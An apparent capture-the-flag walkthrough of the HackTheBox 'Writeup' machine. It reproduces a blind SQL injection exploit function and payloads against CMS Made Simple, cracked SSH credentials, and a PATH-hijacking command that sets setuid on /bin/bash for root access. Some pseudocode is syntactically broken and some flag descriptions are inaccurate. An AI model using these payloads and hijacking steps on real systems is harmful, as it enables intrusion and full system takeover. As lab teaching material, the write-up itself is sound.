<div class="banner">
    <div class="ads">
        <span>K</span>
        Offensive Security
    </div>
    <h1>
        <span>Vishok - Hacking Pentesting</span>
        Wtiteup HTB Writeup
    </h1>
</div>

####
####
## Open ports in the target machine
### Nmap
After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
####
<div class="tip">

> Is time to perfom a scan using **nmap** to discover a treasure. 
</div>

####
```ruby
22/tcp open  ssh
80/tcp open  http
```
####
Result of nmap scan:
####
```ruby
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
####
####
####
## Services that are running in the target machine
### Http
In the previus nmap scan we realese that in the *HTTP* service there are 2 important things; the `robots.txt` file and `writeup/` directory. When we try to open the browser and see the content of the robots file, we see that there is a `writeup/` directory.
####
This directory seems see a writeups blog. The page is blank, with no login or registration sections, so we will perform enumeration to find more things. Although this aproximation **not work**, because the target machine for some reason in particulary **block** the remote connection:
####
```perl
UserWarning:Fatal exception: Pycurl error 7: Failed to connect to 10.10.10.138 port 80 after 384 ms: Couldn't connect to server
```
####
The web application is very empty, this no posses version of any type, if we enter into any writeup, we can see that the url change and use a **php** parameter that pointing does something look like a file: http://writeup.htb/writeup/index.php?page=ypuffy. So having this information, we could to aim aginst other files: http://writeup.htb/writeup/index.php?page=../../../../../etc/passwd. 
####
But this not work. So **whatweb** in many ocations is very hepful to discover the versions of the services that running in the target machine, so if we execute the following command:
####
```perl
whatweb http://10.10.10.138
```
####
The result of the command is:
####
```html
!doctype html>
<html lang="en_US">
    <head>
        <title>Home - writeup</title>
        
        <base href="http://writeup.htb/writeup/" />
        <meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

        <!-- cms_stylesheet error: No stylesheets matched the criteria specified -->
        <style>.footer { background-color: white; position: fixed; left: 0; bottom: 0; width: 100%; color: black; text-align: center; }</style>
    </head>
    <body>
        <header id="header">
            <h1>writeup</h1>
        </header>
        <nav id="menu">
```
####
We are able to see that the target machine is running a: (*CMS Made Simple 2.2.9*), the representation is: 2004-2019, so we will try to exploit this version looking for any exploit in databases like **github** and **exloit-db**.
####
<div class="info">

> **CMS Made Simple** is an Open Source Content Management System. It’s built using *PHP* and the Smarty Engine, which keeps content, functionality, and templates separated.
</div>

####
####
####
## First explotation phase
### SQLi
At the moment to looking for exploit for this version service, we discovered two options: 
####
- Exploits:
  - [Authenticated-RCE-OBI](https://www.rapid7.com/db/modules/exploit/multi/http/cmsms_object_injection_rce) 
  - [CMS-SQL-Injection](https://www.exploit-db.com/exploits/46635) 
####
<div class="warning">

> **CMS Made Simple** version (*2.2.9*) is vulnerable to SQLi (*SQL Injection*), which can be exploited to extract sensitive information from the database. Additionally, there are other vulnerabilities affecting earlier versions of CMS Made Simple, such as RCE (*Remote code execution*) and XSS (*Cross-site scripting*) issues.
</div>

####
The *RCE* is based in authenticated user, so we need to have valid credentials, the other seem to have a better aproximation beacause **dump** the `user`, `password` and `salt`. Next we will explain how work this script. The most importar in all cases are the **username** and **password**.
####
We already now a hint, `writeup/` directory, so we will try execute this fill pointing to this directory. The script craft a **function** to dump the data:
####
```python
def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True
```
####
The payload look like this SQL query:
####
```sql
SELECT sleep(1) FROM cms_users WHERE username LIKE 0x{dictionary[i]}25 AND user_id LIKE 0x31--
```
####
Well, the first statement of the SQL query is very simple, the script is selecting a `sleep` of `1` second and is using the **cms_users** table. But what meaning the rest of the query? The `LIKE` command in SQL is used to compare the value of the column with anything. 
####
So in this case, the script is comparing the value of the column `username` with the value of the variable `db_name` and the value of the column `user_id` with the value of the variable `user_id`.
####
The `db_name` is a character string that is in the **dictionary**. The `user_id` is a number in this case is `1` beacause in all databases the first user usually be the **admin**. The `LIKE` command start comparing the first character, so is very similar to indicate this:
####
```java
db_name = "";
for(var x in dictionary) || for(int i = 0; i < dictionary.length; i++) {
    db_name += x || db_name += dictionary[i];
    if(username.startsWith(x)) || if(username.charAt(i) == db_name.charAt(i))

    // The characteres will be concat 
    // db_name = a
    // db_name = ad
    // db_name = admi
    // db_name = admin

    WHERE username LIKE db_name
}

In some moment the 
```
####
Is a aproximation in **Java** in **Python3** will be:
####
```python
# Is the same of the java code only transformed to python
db_name = ""
for i in range(0, len(dictionary)):
    db_name += dictionary[i]
    if username.startswith(db_name) OR if username.index(i) == db_name.index(i)

    # The characteres will be concat 
    # db_name = a
    # db_name = ad
    # db_name = admi
    # db_name = admin

    WHERE username LIKE db_name
```
####
The same happend with the other functions:
####
```sql
SELECT sleep(1) FROM cms_users WHERE password LIKE 0x{dictionary[i]}25 AND user_id LIKE 0x31--
SELECT sleep(1) FROM cms_siteprefs WHERE sitepref_value LIKE 0x{dictionary[i]}25 AND sitepref_name LIKE 0x736974656d61736b--

-- The date is encoded in hex:
    -- 25 = %
    -- 31 = 1
    -- 736974656d61736b = sitemask
```
####
You can decode that data for see in plane text using **echo** and **xxd** command: `echo '0x736974656d61736b' | xxd -r -p`
####
| Xxd param | Description |
| ----- | ----- |
| -r | Reverse operation: convert (or patch) hexdump into binary |
| -p | Print the specified data as pure hex bytes, with no newlines |
####
So after that, the payload report us the next information: 
####
```perl
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```
####
The password seem to be encrypted, so we will try to crack it using a wordlist. The encription format look to be *MD5*, so we will use a wordlist to try to crack it using **hashcat**, this tool if we execute without especified a **mode**, it analized the hash format a suggest us for the posible hash modes to crack it.
####
```bash
hashcat -a 0 hash /usr/share/wordlists/dictionary/rockyou.txt

Result ->
The following 20 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
     10 | md5($pass.$salt)                                           | Raw Hash salted and/or iterated
     20 | md5($salt.$pass)                                           | Raw Hash salted and/or iterated
   3800 | md5($salt.$pass.$salt)                                     | Raw Hash salted and/or iterated
   3710 | md5($salt.md5($pass))                                      | Raw Hash salted and/or iterated
   4110 | md5($salt.md5($pass.$salt))                                | Raw Hash salted and/or iterated
   4010 | md5($salt.md5($salt.$pass))                                | Raw Hash salted and/or iterated
  21300 | md5($salt.sha1($salt.$pass))                               | Raw Hash salted and/or iterated
     40 | md5($salt.utf16le($pass))                                  | Raw Hash salted and/or iterated
   3910 | md5(md5($pass).md5($salt))                                 | Raw Hash salted and/or iterated
   4410 | md5(sha1($pass).$salt)                                     | Raw Hash salted and/or iterated
  21200 | md5(sha1($salt).md5($pass))                                | Raw Hash salted and/or iterated
     30 | md5(utf16le($pass).$salt)                                  | Raw Hash salted and/or iterated
     50 | HMAC-MD5 (key = $pass)                                     | Raw Hash authenticated
     60 | HMAC-MD5 (key = $salt)                                     | Raw Hash authenticated
   1100 | Domain Cached Credentials (DCC), MS Cache                  | Operating System
     12 | PostgreSQL                                                 | Database Server
   2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                    | Forums, CMS, E-Commerce
   2611 | vBulletin < v3.8.5                                         | Forums, CMS, E-Commerce
   2711 | vBulletin >= v3.8.5                                        | Forums, CMS, E-Commerce
     23 | Skype                                                      | Instant Messaging Service
```
####
We have the **salt** and **password** so the format with both is: `******:******`, following this structure we only have two posible options: `10` and `20` hash mode. The password cracked is: `raykayjay9`. We already have the username and the `22` port in the target machine is open, so we will try to autenticate in it: `ssh jkr@writeup.htb`.
####
| Hashcat param | Description |
| ----- | ----- |
| -a 0 | Bruteforce mode |
| -m | Especify hash mode used to crack the hashes |
####
####
####
## Second exploit phase (Privilage Escalation)
### Staff group
Looking for any kind file in the target machine, we not discovered something. Exist the **pkexec** and **poolkit**, however that machine is not vulnerable to this exploits, we don't have capabilities, config files, backups, database files, etc. The user is not in the **sudoers** group, but if we execute the `id` command we are able to see the groups of the user. Are many groups:
####
```bash
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
```
####
<div class="info">

> The group **staff** on Linux/Unix systems it is traditionally used to grant its members certain additional permissions that normal users do not have, but without giving them full administrator (*root privileges*). For example, on some distributions, users in staff. They may create files in system directories where normally only root could do so, or they may have permissions to use certain commands or access restricted resources. 
</div>

####
To further investigate privilege escalation vectors, I discovered that is necesary to upload in the target machine a file that allow us to see the process that are running in the system I uploaded and executed `pspy32` to monitor processes running as root and any scheduled tasks:
####
```bash
jkr@writeup:~$ cd /tmp
jkr@writeup:/tmp/$ chmod +x pspy32
jkr@writeup:/tmp/$ ./pspy32

Result ->
<...SNIP...>
CMD: UID=0 PID=8528 | sshd: [accepted]
CMD: UID=0 PID=8529 | sshd: [accepted]
CMD: UID=0 PID=8530 | sshd: jkr [priv]
CMD: UID=0 PID=8531 | sh -c /usr/bin/env -i PATH=/usr/local/sbin
    :/usr/local/bin
    :/usr/sbin
    :/usr/bin
    :/sbin
    :/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
CMD: UID=0 PID=8532 | run-parts --lsbsysinit /etc/update-motd.d
CMD: UID=0 PID=8533 | /bin/sh /etc/update-motd.d/10-uname
<...SNIP...>
```
####
By running `pspy32`, I was able to observe **root-level** processes and scripts executed periodically upon *SSH* login. This information is crucial for identifying potential privilege escalation paths, such as writable scripts or misconfigured scheduled tasks that could be exploited to gain root access. So the line: `CMD: UID=0 PID=8530 | sshd: jkr [priv]` indicate with the *UID* 0 that the root user is checking the ssh athentication login attempt, at the same time is rename the content of the `/usr/bin/env` with a new *PATH*: **run-parts**.
####
The run-parts script called the MOTD (Message of the Day) in each login attempt. So if this script execute something like root at the moment to connect with *SSH*, we could insert a **simbolic link** or make a **path hijacking**. The script is created into the `/usr/local/bin`, so first we need to see if we have **write** permissions over this path:
####
```bash
ls -ld /usr/local/bin

drwx-wsr-x 2 root staff 20480 Apr 19 04:11 /usr/local/bin/
drwx-wsr-x 2 root staff 12288 Apr 19 04:11 /usr/local/sbin/
```
####
| Ls param | Description |
| ----- | ----- |
| -l | Long listing format |
| -d | List directores themselves, not their content |
####
Like we are in the **staff** group, we have write permissions here, so we will try make a **path hijacking**:
####
```bash
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts

Final representation ->
echo -e '
    #!/bin/bash
    chmod u+s /bin/bash
' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
```
####
| Param | Description |
| ----- | ----- |
| -e | Interpret backslash escapes |
| -x | Execute the script |
| > | Save into or send to |
| u+s | Set the setuid bit permission |
| +x | Set execute permission |
####
How the script **run-parts** is execute at the moment to authenticate using *SSH* we need to kill the current session and connect again. After the execution of the script, we will have the **bash** with **setuid** bit set, so we will be able to run the bash as root:
####
```bash
/bin/bash -p
```
####
| Param | Description |
| ----- | ----- |
| -p | Run the shell with the **setuid** bit set |
####
